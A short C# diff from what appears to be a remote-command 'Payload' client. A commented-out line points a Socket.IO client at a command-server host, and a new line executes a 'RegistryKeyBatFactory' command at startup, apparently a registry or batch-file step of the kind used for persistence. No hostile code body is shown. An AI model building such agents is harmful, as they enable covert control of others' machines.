@@ -4,9 +4,11 @@ using Payload.Command;
 using Payload.Command.SocketClient;
 using Payload.Core.Command;
 using SocketIOClient;
+//await DemoTest();
+
+new RegistryKeyBatFactory().CreateCommand().Execute();
 
 //var sc = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);
-//await DemoTest();
 
 while (true)
 {
